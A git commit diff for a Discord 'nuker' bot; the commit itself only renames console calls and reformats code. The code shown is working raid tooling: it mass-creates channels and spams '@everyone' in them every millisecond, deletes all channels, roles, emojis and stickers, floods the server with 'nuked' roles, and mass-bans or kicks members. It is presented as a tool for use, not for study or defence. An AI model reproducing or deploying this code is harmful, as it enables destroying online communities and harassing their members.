e5ea400a0a0ba500cbf136c7640ab770d2040b34
Astro Orbis <astroorbis@gmail.com>
2021-09-27 09:33:04 -0400

    Replaced console with Console, and beautified code

--- index.js
+++ index.js
@@ -5,11 +5,12 @@
 const { Client, Intents, MessageEmbed } = require("discord.js");
 const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
 const { red, greenBright, cyan, yellow } = require("chalk");
-const { token, prefix, userID, disableEveryone } = require("config.json")
+const { token, prefix, userID, disableEveryone } = require("config.json");
+const Console = require("Console")
 
 nuker.on("ready", () => {
-    console.clear();
-    console.log(red(`
+    Console.clear();
+    Console.log(red(`
     
                                                    
     ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███  
@@ -27,7 +28,10 @@ nuker.on("ready", () => {
                     Nuker: ${nuker.user.tag}
                     Prefix: ${prefix}
     `))
-    nuker.user.setActivity({ name: "Presser Beta", type: "PLAYING" });
+    nuker.user.setActivity({ 
+        name: "Presser Beta", 
+        type: "PLAYING" 
+    });
 });
 
 nuker.on("messageCreate", (message) => {
@@ -239,9 +243,9 @@ nuker.on("messageCreate", (message) => {
             for (let i = 0; i < amount; i++) {
                 if (message.guild.channels.cache.size === 500) break;
                 if (!channelName) {
-                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) })
                 } else {
-                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) })
                 }
             }
             resolve();
@@ -256,21 +260,34 @@ nuker.on("messageCreate", (message) => {
      */
     function MassChnPing(amount, channelName, pingMessage) {
         return new Promise((resolve, reject) => {
-            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
-            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
-            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
-            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
-            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
+            if (!amount) {
+                return reject("Unspecified Args: Specify the amount you wish to mass channels");
+            }
+            if (isNaN(amount)) {
+                return reject("Type Error: Use a number for the amout");
+            }
+            if (amount > 500) {
+                return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
+            }
+            if (!channelPerms) {
+                return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
+            }
+            if (!pingMessage) {
+                return reject("Unspecified Args: Specify the message you wish to mass mention");
+            }
+
             for (let i = 0; i < amount; i++) {
-                if (message.guild.channels.cache.size === 500) break;
+                if (message.guild.channels.cache.size === 500) {
+                    break;
+                }
                 if (!channelName) {
-                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
+                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) }).then((ch) => {
                         setInterval(() => {
                             ch.send("@everyone " + pingMessage);
                         }, 1);
                     });
                 } else {
-                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
+                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) }).then((ch) => {
                         setInterval(() => {
                             ch.send("@everyone " + pingMessage);
                         }, 1); // literally not possible but lol?
@@ -287,7 +304,7 @@ nuker.on("messageCreate", (message) => {
     function DelAllChannels() {
         return new Promise((resolve, reject) => {
             if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
-            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
             resolve();
         });
     }
@@ -305,9 +322,9 @@ nuker.on("messageCreate", (message) => {
             for (let i = 0; i <= amount; i++) {
                 if (message.guild.roles.cache.size === 250) break;
                 if (!roleName) {
-                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) })
                 } else {
-                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) })
                 }
             }
         })
@@ -319,7 +336,7 @@ nuker.on("messageCreate", (message) => {
     function DelAllRoles() {
         return new Promise((resolve, reject) => {
             if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
-            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
         });
     }
 
@@ -329,7 +346,7 @@ nuker.on("messageCreate", (message) => {
     function DelAllEmotes() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
         });
     }
 
@@ -339,7 +356,7 @@ nuker.on("messageCreate", (message) => {
     function DelAllStickers() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
         });
     }
 
@@ -356,7 +373,7 @@ nuker.on("messageCreate", (message) => {
                     for (let i = 0; i < arrayOfIDs.length; i++) {
                         const user = arrayOfIDs[i];
                         const member = message.guild.members.cache.get(user);
-                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
+                        member.ban().catch((err) => { Console.log(red("Error Found: " + err)) }).then(() => { Console.log(greenBright(`${member.user.tag} was banned.`)) });
                     }
                 }, 2000);
             })
@@ -376,7 +393,7 @@ nuker.on("messageCreate", (message) => {
                     for (let i = 0; i < arrayOfIDs.length; i++) {
                         const user = arrayOfIDs[i];
                         const member = message.guild.members.cache.get(user);
-                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
+                        member.kick().catch((err) => { Console.log(red("Error Found: " + err)) }).then(() => { Console.log(greenBright(`${member.user.tag} was kicked.`)) });
                     }
                 }, 2000);
             })
@@ -386,6 +403,6 @@ nuker.on("messageCreate", (message) => {
 
 try {
     nuker.login(token);
-} catch (err) {
-    console.error(err)
+} catch (e) {
+    Console.error(e)
 }
